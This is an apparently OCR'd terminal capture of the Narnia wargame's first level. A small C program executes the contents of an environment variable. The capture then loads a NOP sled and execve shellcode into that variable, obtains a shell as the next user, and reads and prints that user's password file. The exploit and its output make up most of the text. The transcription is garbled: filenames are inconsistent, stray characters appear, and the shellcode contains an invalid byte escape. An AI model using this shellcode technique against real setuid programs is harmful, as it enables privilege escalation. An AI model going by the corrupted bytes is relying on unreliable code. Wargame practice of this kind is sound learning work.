```text
L Terminat
:/narnia$ cat narniat.c
/*
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA
“Y
#include <stdio.h>
int main( ){
int (*ret)();
if(getenv( "EGG" )==NULL ){
printf("Give me something to execute at the env-variable EGG\n");
exit(1);
}
printf("Trying to execute EGG!\n");
ret = getenv("EGG");
ret();
return 0;
}
:/narnia$ export EGG=$(python3 -c ‘import sys; sys.stdout.buffer.write(b"\x90"*1000 + b"\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xdi
\x9d\x96\x91\xF7\xd7\xF7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80" )')
:/narnia$ ./narnial
Trying to execute EGG!
$ whoami
narniat
$ cat /etc/narnia_pass/narniat
WDcYUTG5uL
$ *C
```
